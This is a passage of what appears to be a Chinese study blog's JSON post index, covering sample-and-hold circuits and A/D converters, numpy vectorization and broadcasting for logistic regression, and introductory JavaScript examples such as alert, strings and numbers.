3.4采样保持器当某一通道进行A/D转换时，由于A/D转换需要一定时间，如果输入信号变化较快，就会引起较大的转换误差。为了保证转换的精度，需要应用采样保持器。 3.4.1 采样定理以一定时间间隔对连续的信号进行采样，使连续信号转换为时间上离散的、幅值上连续的脉冲序列的过程称为采样过程。 把连续变化的量变成离散量后再进行处理的计算机控制系统，称为采样数据系统或离散系统。 离散系统的采样形式： 周期采样（应用最多） 多阶采样 随机采样 采样开关每次闭合的时间称为采样时间或采样宽度，采样开关每次通断的时间间隔称为采样周期T。 香农定理：为了使采样信号f*(t)能完全复现原信号f(t)，采样频率fs至少要为原信号最高有效频率fmax的两倍，即：fs≥2fmax 若选择的频率对连续信号所含的最高频率来说，能做到在其一个周期内采样两次以上，则在采样获得的脉冲序列中将包含连续信号的全部信息。反之，若采样信号次数太少，就做不到无失真地再现原连续信号。 实际：fs≥（5~10）fmax 3.4.2 零阶采样保持器 在两次采样时间间隔内，根据采样信号而复现原信号的装置被称为保持器。当用常数、线性函数和抛物线函数去逼近两个相邻采样时间的原信号时，分别称为零阶、一阶、高阶采样保持器。 零阶采样保持器是最常用的一种信号保持器，它在两次采样的间隔时间内，一直保持采样值不变，直到下一个采样时刻，如上图所示，采样保持器由输入/输出缓冲放大器A1、A2和采样开关S、保持电容CH等组成。 采样期间，开关S闭合，输入电压VIN通过A1对CH快速充电，输出电压VOUT跟随VIN变化；保持期间，开关S断开，由于A2的输入阻抗很高，理想情况下电容CH将保持电压VC不变，因而输出电压VOUT = VIN也保持恒定。 显然，保持电容CH的作用很重要。实际上，保持期间的电容保持电压VC在慢慢下降，这是由于保持电容的漏电流所致。保持电压的变化率：$$\\frac{dV_C}{dt} = \\frac{I_D}{C_H}$$ID是保持期间电容总泄漏电流，它包括放大器的输入电流、开关截止时的漏电流等。增大电容CH可以减小电压变化率，但同时又会增加充电即采样时间，因此保持电容的容量大小与采样精度成正比而与采样频率成反比。 常见的零阶采样保持器有：AD582(图a)、LF198/LF298/LF398(图b)。这里用TTL逻辑电平控制采样和保持状态：当LF198/LF298/LF398的引脚8为低电平时，开关S断开，电路进入保持状态。AD582的控制逻辑与之相反。 在A/D通道中，采样保持器的采样和保持电平与后级的A/D转换相配合，该电平信号既可以由其他控制电路产生，也可以由A/D转换器直接提供。总之采样器在采样期间，不启动A/D转换器，而一旦进入保持期间，则立即启动A/D转换器，从而保证A/D转换时的模拟输入电压恒定，以确保A/D转换的精度。 3.5 A/D转换器A/D转换器能把输入的模拟电压变成与它成正比的数字量，即能把被控对象的各种模拟信息变成计算机可以识别的数字信息。 3.5.1 工作原理和性能指标 逐位逼近式A/D转换 速度较快，精度也较高，目前应用最多的一种。 双积分式A/D转换 转换速度慢，但转换精度高，多用于数据采集系统 电压/频率式A/D转换 接口原理简单，转换速度较慢，但精度较高，适合于远距离的数据传送。 逐位逼近式A/D转换原理 1个n位A/D转换器是由：逐位逼近寄存器、D/A转换器、比较器、控制时序和逻辑电路、数字量输出锁存器五部分组成。 现以4位A/D转换器把模拟量9转换为二进制1001为例，说明诸位逼近式A/D转换器工作原理： 如上图，当启动信号作用后，时钟信号在控制逻辑作用下，首先使逐位逼近寄存器的最高位D3，其余为0，此时数字量1000经D/A转换器转换成模拟量即：V0 = 8，送到比较器的输入端与被转换的模拟量VIN = 9进行比较，控制逻辑根据比较器的输出进行判断。若VIN ≥V 0，则保留D3；再对下一位D2进行比较，同样先使D2 = 1，与上一位D3一起即1100进入D/A转换器，转换为V0 = 12再进入比较器，与VIN进行比较，因为VIN ＜V 0，所以使D2 = 0；再下一位D1位也是如此，D1 = 1，经D/A转换为V0 = 10，因为VIN ＜V 0，所以使D1 = 0；最后一位D0 = 1，经D/A转换为V0 = 9，再与VIN进行比较，因为VIN ≥ V 0，故保留D0 = 1。比较结束，逐位逼近寄存器中的数字量1001极为模拟量9的转换结果，存在数字输出锁存器中等待输出。 一个n位A/D转换器的A/D转换表达式：$$B = \\frac{V_{IN} - V_{R-}}{V_{R+} - {V_{R-}}} × 2^n\\B：转换后的输出数字量\\V_{IN}：要转换的输入模拟量\\V_{R+}、V_{R-}：基准电压源的正、负输入。$$即：当基准电压源确定后，n位A/D转换器的数字输出量B与要转换的输入模拟量VIN成正比。 此种A/D转换器的常用品种有普通型8位单路ADC0801～ADC0805、8位8路ADC0808/0809、8位16路ADC0816/0817等，混合集成高速型12位单路AD574A、ADC803等。 双积分式A/D转换原理 上图为原理图，在转换开始信号控制下，开关接通模拟输入端，输入的模拟电压VIN在固定时间T内对积分器上的电容C开始充电(正向积分)，时间一到，控制逻辑将开关切换到与VIN极性相反的基准电源上，此时电容C开始放电(反向积分)，同时计数器开始计数。当比较器判定电容C放电完毕时输出信号，由控制逻辑停止计数器的计数，并发出转换结束信号。这时计数器所记的脉冲个数正比于放电时间。 放电时间T1或T2正比于输入电压VIN，即输入电压大，则放电时间长，计数器的计数值越大。因此，计数器计数值的大小反映了输入电压VIN在固定积分时间T内的平均值。 此种A/D转换器品种常有输出为3位半BCD码(二进制编码的十进制数)的ICL7107、MC14433、输出为4位半BCD码的ICL7135等。 电压/频率式A/D转换原理电压/频率式A/D转换器简称V/F转换器，是把模拟电压信号转换为频率信号的器件。 实现V/F转换的方法很多，现以常见的电荷平衡V/F转换法说明其转换原理： A1是积分放大器，A2为零电压比较器，恒流源IR和开关S构成A1的反充电回路，开关S由单稳态定时器触发控制。当积分放大器A1的输出电压V0下降到零时，零电压比较器A2输出跳变，触发单稳态定时器，产生暂态时间为T1的定时脉冲，并使开关S闭合；同时又使晶体管VT截止，频率输出端VfO输出高电平。在开关S闭合期间，恒流IR被接入积分器的“-”输入端。由于电路是按IR＞VImax / RI设计的，故此时电容C被反向充电，充电电流为IR~VI / RI，则积分器A1输出电压VO从零开始线性上升。当定时时间T1结束，定时器恢复稳态，使开关S断开，反向充电停止，同时使晶体导管VT导通，VfO输出低电平。 开关S断开后，正输入电压V1开始对电容C正向充电，其充电电流为VI / RI，则积分放大器A1输出电压VO开始线性下降。当VO = 0时， 3.6 A/D转换模板第4 章 数字量输入/输出通道第5章 键盘及其接口技术第6章 显示器及其接口技术第7章数据处理技术第8章 抗干扰技术第9章 数字控制器第10章 控制网络技术第 11 - 14 章 略补充 Z变换（重点）","categories":[],"tags":[{"name":"考试","slug":"考试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E8%80%83%E8%AF%95/"}]},{"title":"pytorch深度学习框架","slug":"深度学习框架","date":"2021-11-09T12:28:34.000Z","updated":"2021-11-16T07:51:04.898Z","comments":true,"path":"2021/11/09/深度学习框架/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/11/09/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/","excerpt":"","text":"","categories":[],"tags":[{"name":"pytorch","slug":"pytorch","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/pytorch/"}]},{"title":"部分DL笔记","slug":"DeepLearning","date":"2021-10-25T09:21:02.000Z","updated":"2021-11-23T13:13:02.736Z","comments":true,"path":"2021/10/25/DeepLearning/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/10/25/DeepLearning/","excerpt":"","text":"P17 Vectorization 什么是Vectorization？ 在Logistic Regression中，我们需要去计算$$z = w^Tx + b\\w =\\begin{bmatrix}. \\. \\.\\end{bmatrix}_{n1}x =\\begin{bmatrix}. \\. \\.\\end{bmatrix}_{n*1}，w\\in R^{n_x}$$如果有很多特征，那么他们就是非常大的向量，所以w和x都是R内的nX维向量 在Python或Numpy中，使用z = np.dot(w,x)+b来计算上面的式子，并且比使用for loop来计算快得 P18 More vectorization examples上一节课学习了如何向量化，如何使用内置函数，避免使用显式for loop，能不使用它就不要去使用。这样可以使得程序运行速度显著加快，让我们再看几个例子。 让v向量转化为u向量$$v = \\begin{bmatrix}v_1 \\ .\\ .\\ .\\v_n\\end{bmatrix},u = \\begin{bmatrix}e^{v_1} \\ .\\ .\\ .\\e^{v_n}\\end{bmatrix}$$ 一种非向量化的实现 12345import numpy as npu = np.zeros((n,1))for i in range (n): u[i] = math.exp(v[i]) 注释：np.zeros()返回来一个给定形状和类型的用0填充的数组 zeros(shape, dtype=float, order=‘C’)shape:形状dtype:数据类型，可选参数，默认numpy.float64order:可选参数，c代表与c语言类似，行优先；F代表列优先 12345import numpy as npprint(np.zeros((2,5)))# [[0. 0. 0. 0. 0.]# [0. 0. 0. 0. 0.]] 利用numpy实现 1234import numpy as npu = np.zeros((n,1))u = np.exp(v) numpy的其他方法需要是np.array()创建的vector np.log()：返回对所有元素取对数之后的向量 np.abs()：返回对所有元素取绝对值之后的向量 np.maximum()：返回向量中所有元素和0相比的最大值 v**2：返回对所有元素取平方之后的向量 1/v：返回对所有元素取倒数之后的向量 np.dot()：函数主要功能有两个——向量点积和矩阵乘法 向量点积：如果处理的是一维数组，则得到的是两数组的內积。 例1： 123456import numpy as npx=np.array([0,1,2,3,4])#等价于:x=np.arange(0,5)y=x[::-1]print xprint yprint np.dot(x,y) 输出： 123[0 1 2 3 4][4 3 2 1 0]10 例2： 123456import numpy as npx=np.arange(0,5)y=np.random.randint(0,10,5)print xprint yprint np.dot(x,y) 输出： 123[0 1 2 3 4][5 1 0 9 2]36 如果是二维数组（矩阵）之间的运算，则得到的是矩阵积 1.np.dot(x, y), 当x为二维矩阵，y为一维向量，这时y会转换一维矩阵进行计算 首先，我们来看一下一维向量和一位矩阵的不同 例3： 12345678910import numpy as npx=np.arange(0,5)# 0,10，是随机数的方位，size=(5,1),也就是5维矩阵，且每一维元素数为1个y=np.random.randint(0,10,size=(5,1))print xprint y# 查看矩阵或者数组的维数print &quot;x.shape:&quot;+str(x.shape)print &quot;y.shape&quot;+str(y.shape)print np.dot(x,y) 输出： 123456789[0 1 2 3 4][[3] [7] [2] [8] [1]]x.shape:(5,)y.shape(5, 1)[39] 可以看出一维向量的shape是(5, ), 而一维矩阵的shape是(5, 1), 若两个参数x和y中有一个是矩阵时（包括一维矩阵），dot便进行矩阵乘法运算，同时若有个参数为向量，会自动转换为一维矩阵进行计算。 2.np.dot(x, y)中，x、y都是二维矩阵，进行矩阵积计算 np.dot(x, y)两个二维矩阵满足第一个矩阵的列数与第二个矩阵的行数相同，那么可以进行矩阵的乘法，即矩阵积 例4： 12345678import numpy as npx=np.arange(0,6).reshape(2,3)y=np.random.randint(0,10,size=(3,2))print xprint yprint &quot;x.shape:&quot;+str(x.shape)print &quot;y.shape&quot;+str(y.shape)print np.dot(x,y) 输出： 123456789[[0 1 2] [3 4 5]][[7 5] [0 7] [6 2]]x.shape:(2, 3)y.shape(3, 2)[[12 11] [51 53]] 注意：矩阵积计算不遵循交换律,np.dot(x,y) 和 np.dot(y,x) 得到的结果是不一样的。 简化Logistic Regression代码 这里去掉了一个for loop，一个用来遍历特征的循环，以便加快计算，后面将学习如何去掉遍历样本的循环 P19 Vectorizing Logistic Regression如何实现在Logistic Regression上面的向量化，以便可以同时处理整个训练集，来实现gradient descent的一步迭代，针对整个训练集的一步迭代，而不需要使用任何显式的for loop。$$z^{(i)} = w^Tx^{(i)} + b \\a^{(i)} = \\sigma(z^{(i)})\\X = \\begin{bmatrix}.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\x^{(1)}&amp;x^{(2)}&amp;…… &amp;x^{(m)}\\.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\\\end{bmatrix}_{n_xm}\\\\Z = [z{(1)}z{(2)},……z{(m)}] = w^TX+[b,……,b]_{1m} = [w^TX^{(1)}+b,w^TX^{(2)}+b,……,w^TX^{(m)}+b]\\\\A = [a^{(1)},a^{(2)},……,a^{(m)}] = \\sigma(Z)$$使用numpy： 123import numpy as npZ = np.dot(w.T,x) + b# 此处b会被自动扩展为一个1*m的行向量,在python中叫做广播(broadcasting) p20 Vectorizing Logistic Regression’s Gradient Computation我们将学习如何向量化同时计算m个训练数据的梯度。 回顾：$$dz^{(1)} = a^{(1)} - y^{(1)}……dz^{(m)} = a^{(m)} - y^{(m)}\\dz = [dz^{(1)},……,dz^{(m)}]{1*m}$$我们已经描述了如何计算：$$a^{(i)} = \\sigma(z^{(i)})\\X = \\begin{bmatrix}.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\x^{(1)}&amp;x^{(2)}&amp;…… &amp;x^{(m)}\\.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\\\end{bmatrix}{n_xm}\\\\Z = [z{(1)}z{(2)},……z{(m)}] = w^TX+[b,……,b]_{1m} = [w^TX^{(1)}+b,w^TX^{(2)}+b,……,w^TX^{(m)}+b]\\A = [a^{(1)},a^{(2)},……,a^{(m)}] = \\sigma(Z)\\Y = [y^{(1)},y^{(2)},……,y^{(m)}]{1*m}$$那么有：$$dZ = [dz^{(1)},dz^{(2)},……,dz^{(m)}]=\\A - Y = [a^{(1)}-y^{(1)},a^{(2)}-y^{(2)},……,a^{(m)}-y^{(m)}]$$虽然我们已经去掉了一个for loop（用于遍历每个样本的特征的循环）但是我们仍然还有一个遍历训练集的for loop，以w计算为例：$$dw = 0\\dw += x^{(1)}dz\\dw += x^{(2)}dz\\dw += x^{(3)}dz\\……\\dw += x^{(m)}dz\\dw /= m\\\\db = 0\\db += dz^{(1)}\\db += dz^{(2)}\\db += dz^{(3)}\\……\\db += dz^{(m)}\\db /= m$$向量化实现：$$db = \\frac{1}{m}\\sum{i=1}^mdz^{(i)}$$ 12import numpy as mpdb = 1/m*np.sum(dZ) $$dw = \\frac{1}{m}X(dZ)^T \\= \\frac{1}{m}\\begin{bmatrix}.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\x^{(1)}&amp;x^{(2)}&amp;…… &amp;x^{(m)}\\.&amp;.&amp;&amp;. \\.&amp;.&amp;&amp;. \\\\end{bmatrix}_{n_x*m}\\begin{bmatrix}dz^(1) \\.\\.\\dz^{(m)}\\end{bmatrix}_{m1}\\=\\frac{1}{m}[x^{(1)}dz^{(1)}+……+x^{(m)}dz^{(m)}]$$ 所以，综上，对于一次迭代应该有：$$Z = w^Tx+b=np.dot(w.T,X) + b\\A=\\sigma(Z)\\dZ = A-Y\\dw = \\frac{1}{m}XdZ^T\\db = \\frac{1}{m}np*sum(dZ)\\w := w -\\alpha dw \\b := b - \\alpha db$$可以看到我们去掉了所有的for loop，但是，要由于要进行多次迭代，我们仍然需要使用for loop，即：for iteration in range(times) p21 Python中的广播广播是一种可以让python代码执行得更快的手段，本节介绍python中的广播是如何运作的。 计算每种食物中，来自carbon的calorie所占的比例，但是不使用for loop 用一行代码对各列求和，可得到四种不同食物的卡路里总量、 第二行代码让每一列都除以对应的和 1234567891011121314151617181920212223242526272829303132333435import numpy as np# 例子1：A = np.array([[56.0, 0.0, 4.4, 68.0], [1.2, 104.0, 52.0, 8.0], [1.8, 135.0, 99.0, 0.9]])print(A)calorie = A.sum(axis=0)# axis 代表每列竖直相加，如果希望水平方向相加，可以令axis = 1print(calorie)percentage = 100 * A / calorie.reshape(1, 4)# 使用矩阵A，将它除以1x4的矩阵,就得到百分比矩阵# 这里可以省略reshape，由于它的算法复杂度为O(1)，成本很低，所以能写就写，以确保矩阵的正确性# A为3x4矩阵，将他除以一个1x4的矩阵，这似乎是不可行的print(percentage)# 例子2：B = np.array([1, 2, 3, 4])B += 10print(B) # [11 12 13 14]# 例子3：C = np.array([[2, 0, 35, 5], [54, 54, 4545, 5]])print(B + C)# [[ 13 12 48 19]# [ 65 66 4558 19]]# 将一个m*n的矩阵加上一个1*n的矩阵，python会将矩阵复制m次，将它变成一个m*n的矩阵之后再相加D = np.array([100, 100]).reshape(2, -1)print(C + D)# [[ 102 100 135 105]# [ 154 154 4645 105]]# 这里水平复制了三次 python广播中的一些通用规则： numpy中reshape函数的三种常见相关用法 numpy.arange(n).reshape(a, b) 依次生成n个自然数，并且以a行b列的数组形式显示 12345np.arange(16).reshape(2,8) #生成16个自然数，以2行8列的形式显示# Out: # array([[ 0, 1, 2, 3, 4, 5, 6, 7],# [ 8, 9, 10, 11, 12, 13, 14, 15]]) mat (or array).reshape(c, -1) 必须是矩阵格式或者数组格式，才能使用 .reshape(c, -1) 函数， 表示将此矩阵或者数组重组，以 c行d列的形式表示 123arr.shape # (a,b)arr.reshape(m,-1) #改变维度为m行、d列 （-1表示列数自动计算，d= a*b /m arr.reshape(-1,m) #改变维度为d行、m列 （-1表示行数自动计算，d= a*b /m ） -1的作用就在此**: 自动计算d：d=数组或者矩阵里面所有的元素个数/c**, d必须是整数，不然报错） （reshape(-1, m)即列数固定，行数需要计算） 1234567891011121314151617181920212223242526272829303132arr=np.arange(16).reshape(2,8)arr&#x27;&#x27;&#x27;out:array([[ 0, 1, 2, 3, 4, 5, 6, 7], [ 8, 9, 10, 11, 12, 13, 14, 15]])&#x27;&#x27;&#x27;arr.reshape(4,-1) #将arr变成4行的格式，列数自动计算的(c=4, d=16/4=4)&#x27;&#x27;&#x27;out:array([[ 0, 1, 2, 3], [ 4, 5, 6, 7], [ 8, 9, 10, 11], [12, 13, 14, 15]])&#x27;&#x27;&#x27; arr.reshape(8,-1) #将arr变成8行的格式，列数自动计算的(c=8, d=16/8=2)&#x27;&#x27;&#x27;out:array([[ 0, 1], [ 2, 3], [ 4, 5], [ 6, 7], [ 8, 9], [10, 11], [12, 13], [14, 15]])&#x27;&#x27;&#x27; arr.reshape(10,-1) #将arr变成10行的格式，列数自动计算的(c=10, d=16/10=1.6 != Int)&#x27;&#x27;&#x27;out:ValueError: cannot reshape array of size 16 into shape (10,newaxis)&#x27;&#x27;&#x27; numpy.arange(a,b,c) 从 数字a起, 步长为c, 到b结束，生成array numpy.arange(a,b,c).reshape(m,n) ：将array的维度变为m 行 n列。 123456789np.arange(1,12,2)#间隔2生成数组，范围在1到12之间# Out: array([ 1, 3, 5, 7, 9, 11])np.arange(1,12,2).reshape(3,2)&#x27;&#x27;&#x27;Out: array([[ 1, 3], [ 5, 7], [ 9, 11]])&#x27;&#x27;&#x27; P22 A note on python / numpy vectors123456789101112131415161718192021222324252627import numpy as npa = np.random.randn(5)# 生成5个随机的高斯变量，存储在数组a中print(a.shape)# (5,)，这种结构就是所谓的Python秩为1的数组，它既不是行向量，也不是列向量# m × n矩阵的秩最大为m和n中的较小者print(a.T) # a和a的转置看起来相同print(np.dot(a, a.T)) # 4.676296983566586# 建议不要使用上述a这种形式的数据结构编写代码，推荐使用以下方式构建向量a = np.random.randn(5, 1)print(a)# [[ 1.06285306]# [ 0.09125329]# [-1.03121605]# [-0.28563524]# [ 1.55272952]]print(a.shape) # (5, 1)print(a.T)# [[ 1.06285306 0.09125329 -1.03121605 -0.28563524 1.55272952]]print(np.dot(a, a.T))# 或者你也可以使用reshape()来重构向量# assert(a.shape == (5,2))断言，可以用来检查向量是否 p23 Jupyter_ipython（略）p24 Explanation of logistic regression cost funcion","categories":[],"tags":[{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Deep-Learning/"}]},{"title":"JavaScript基础 + 高级","slug":"JavaScript基础+高级","date":"2021-09-30T07:26:09.000Z","updated":"2021-11-25T08:24:07.130Z","comments":true,"path":"2021/09/30/JavaScript基础+高级/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/09/30/JavaScript%E5%9F%BA%E7%A1%80+%E9%AB%98%E7%BA%A7/","excerpt":"","text":"JavaScript基础01 JavaScript简介起源• JavaScript诞生于1995年，它的出现主要是用于处理网页中的前端验证。 • 所谓的前端验证，就是指检查用户输入的内容是否符合一定的规则。 • 比如：用户名的长度，密码的长度，邮箱的格式等。 简史• JavaScript是由网景公司发明，起初命名为LiveScript，后来由于SUN公司的介入更名为了JavaScript。 • 1996年微软公司在其最新的IE3浏览器中引入了自己对JavaScript的实现JScript。 • 于是在市面上存在两个版本的JavaScript，一个网景公司的JavaScript和微软的JScript。 • 为了确保不同的浏览器上运行的JavaScript标准一致，所以几个公司共同定制了JS的标准名命名为ECMAScript。 年份 事件 1995 网景公司开发了JavaScript 1996 微软发布和JavaScript兼容的JScript 1997 ECMAScript第1版（ECMA-262） 1998 ECMAScript第2版 1998 DOM Level1制定 1998 新型语言DHTML登场 1999 ECMAScript第3版 2000 DOM Level2制定 2002 ISO/IEC 16262:2002确立 2004 DOM Level3制定 2005 新型语言Ajax登场 2009 ECMAScript第5版 2009 新型语言HTML5登场 实现 ECMAScript是一个标准，而这个标准需要由各个厂商去实现。 不同的浏览器厂商对该标准会有不同的实现。 浏览器 JavaScript实现方式 FireFox SpriderMonkey Internet Explorer JScript/Chakra Safari JavaScriptCore Chrome v8 Carakan Carakan 我们已经知道ECMAScript是JavaScript标准，所以一般情况下这两个词我们认为是一个意思。 但是实际上JavaScript的含义却要更大一些。 一个完整的JavaScript实现应该由以下三个部分组成： 学习内容 我们已经知道了一个完整的JavaScript实现包括了三个部分： ECMAScriprt、DOM、BOM 由此我们知道学习的内容也是这三个部分： ECMAScript DOM BOM 特点 JS的特点 解释型语言 类似于C和Java的语法结构 动态语法 基于原型的面向对象 解释型语言 JavaS cript是一门解释型语言，所谓解释型值语言不需要被编译为机器码再执行，而是直接执行。 由于缺少这一步骤，所以解释型语言开发起来尤为轻松，但是解释型语言运行较慢也是它的劣势。 不过解释型语言中使用了JIT技术，使得运行速度得以改善。 类似于C和Java的语法结构 JavaScript的语法结构与C和Java很像，像for 、if 、while等语句和Java基本是一摸一样的 所有有过C和Java基础的同学学习起来会轻松很多 不过JavaScript和与Java的关系也仅仅只是看起来像而已 动态语言 JavaScript是一门动态语言，所谓的动态语言可以暂时理解为在语言中的一切内容是不确定的。比如，一个变量在这一时刻是一个整型，但是在下一刻可能就会变成字符串了。当然这个问题我们以后再谈。 不过再补充一句，动态语言相比静态语言性能要差一点，不过由于JavaScript中应用了JIT，所以JS可能是运行速度最快的动态语言了 基于原型的面向对象 JavaScript是一门面向对象的语言，但是与Java不同，JavaScript是基于原型的面向对象。 02 HelloWorld案例123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;HelloWorld&lt;/title&gt; &lt;script&gt; // JS代码要编写在script标签中 /* 控制浏览器弹窗 */ alert(&quot;你好啊！&quot;); // 让页面输出一个内容 document.write(&quot;mk&quot;) // 控制台输出 console.log(&quot;曾经沧海难为水&quot;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 03 js代码编写位置12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;js编写位置&lt;/title&gt; &lt;!-- 可以将js代码编写到js文件中，然后通过script标签引入 写到外部文件中可以在不同的页面中同时引入，也可以利用到浏览器的缓存机制 推荐使用的方式 注意：script标签一旦引入外部文件，就不能再编写代码了，即使写了，浏览器也会忽略，如果需要，则可以再创建一个新的script标签用于编写内部代码 代码执行为顺序执行 --&gt; &lt;script src=&quot;./js/03js编写位置.js&quot;&gt;&lt;/script&gt; &lt;script&gt; alert(&quot;写在script标签上的代码&quot;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 可以将js代码编写在标签的onclick属性上 点击后触发事件，js代码执行 虽然可以写在标签属性中，但是它们属于结构与行为耦合，不方便维护，不推荐使用，可以写在script标签里，还可以写在外部js文件中，然后通过script标签引入 --&gt; &lt;button onclick=&quot;alert(&#x27;js代码编写在标签的onclick属性&#x27;)&quot;&gt;点击&lt;/button&gt; &lt;!-- 可以将js代码写在href属性中，这样当点击时，会执行js代码 --&gt; &lt;a href=&quot;javascript:alert(&#x27;你好啊&#x27;);&quot;&gt;点击超链接&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;点击超链接&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 04 基础语法1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;js基本语法&lt;/title&gt; &lt;script&gt; /* 多行注释 JS注释 多行注释,注释中的内容不会执行,但是可以在源代码中查看 要养成编写注释的良好习惯,也可以通过注释来对代码进行一些简单的调试 */ // 单行注释 /* 1. JS中严格区分大小写 2.JS中每一条语句以(;)结尾,如果不写浏览器会自动添加,但是会消耗一些系统资源. 而且有时候浏览器会加错分号,所以开发中最好写分号 3.JS中会自动忽略多个空格和换行,所以我们可以利用空格和换行进行格式化 */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 05 字面量和常量123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;字面量和变量&lt;/title&gt; &lt;script&gt; /* 字面量:都是一些不可改变的`值 比如:1 2 3 4 5 6 字面量都是可以直接使用,但是我们一般不会直接使用字面量 变量:可以用来保存字面量,而且变量的值是可以任意变化的 变量更加方便了我们使用,所以开发中都是使用变量去保存一个字面量,而很少直接使用字面量 可以通过变量对字面量进行描述 */ // 声明变量 // 在js中使用var关键字来声明一个变量,并为它赋值 var a = 1; console.log(a); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 06 标识符 07 字符串String123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;字符串&lt;/title&gt; &lt;script&gt; /* 数据类型指的是字面量的类型 在JS中一共有6种数据类型 String 字符串 Number 数值 Boolean 布尔值 Null 空值 Underfined 未定义 Object 对象 其中String Number Null Underfined Boolean属于基本数据类型,而Object属于引用数据类型 */ /* String字符串 - 在JS中使用字符串需要使用引号引起来 - 使用双引号或单引号都可以，但是不要混用 - 引号不能嵌套，双引号中不能放双引号，单引号中不能放单i引号；但是可以在单引号中放双引号，双引号中放单引号。 或者可以使用转义字符，当需要表示一些特殊符号时可以使用\\进行转义 \\n：换行符 \\t：制表符 */ var str = &quot;hello&quot;; // 输出变量 console.log(str); // 输出字面量 console.log(&quot;str&quot;); var welcome = &quot;我说： \\&quot;你好\\&quot;&quot;; console.log(welcome); var str2 = &quot;你好\\n你快乐吗？&quot;; var str3 = &quot;1\\t2\\t3\\t4\\t5\\t6&quot;; console.log(str2, str3); var str4 = &quot;\\\\&quot;; console.log(str4); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 08 Number12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Number&lt;/title&gt; &lt;script&gt; /* - Number:在JS中所有的数值都是Number类型， 包括整数和浮点数（小数） JS中可以表示数字的最值 MAX：1.7976931348623157e+308 MIN：5e-324（大于0的最小值） 如果结果超出表示范围：将会返回Infinity / -Infinity 注意：这里的Infinity是字面量，可以用于赋值，使用typeof检查，将返回Number NaN是一个特殊的数字，表示Not a Number 使用typeof检查一个NaN也会返回number - JS中，整数的计算基本可以保持精确 但是使用JS进行浮点运算，可能得到一个不精确的结果，这是二进制运算导致的，所以千万不要使用JS进行对精确度要求较高的运算 */ var a = 123; console.log(a); var b = &quot;3.1415926&quot; a = 3.1415926; console.log(a); console.log(b); /* 可以使用一个运算符typeof来检查一个变量的类型 语法：typeof 变量 */ console.log(typeof a); // number console.log(typeof b); // string // Number的最值 console.log(Number.MAX_VALUE); // 1.7976931348623157e+308 console.log(Number.MIN_VALUE); // 5e-324 console.log(Number.MAX_VALUE * Number.MAX_VALUE); // Infinity console.log(typeof Infinity); //Number var c = &quot;abc&quot; * &quot;bcd&quot;; console.log(c); //NaN，即Not a Number console.log(typeof NaN); // Number var d = 123 + 456; console.log(d); var e = 0.1 + 0.2; console.log(e); // 0.30000000000000004 &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 09 Boolean123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta 